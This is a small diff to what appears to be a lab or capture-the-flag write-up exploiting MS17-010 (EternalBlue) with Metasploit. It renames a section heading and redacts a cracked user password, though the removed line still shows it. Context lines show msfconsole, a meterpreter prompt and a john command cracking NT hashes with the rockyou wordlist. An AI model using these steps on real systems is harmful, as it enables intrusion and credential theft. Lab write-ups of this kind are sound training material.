@@ -44,7 +44,7 @@ Host script results:
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
-EXPLOIT
+EXPLOITATION WITH ETERNAL BLUE MSF
 msfconsole
                                                   
 
@@ -232,7 +232,7 @@ meterpreter >
 POST EXPLOITATION
 root@kali:~/# john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
                  (Administrator)
-alqfna22         (Jon)
+######         (Jon)
 
 FLAGS
 
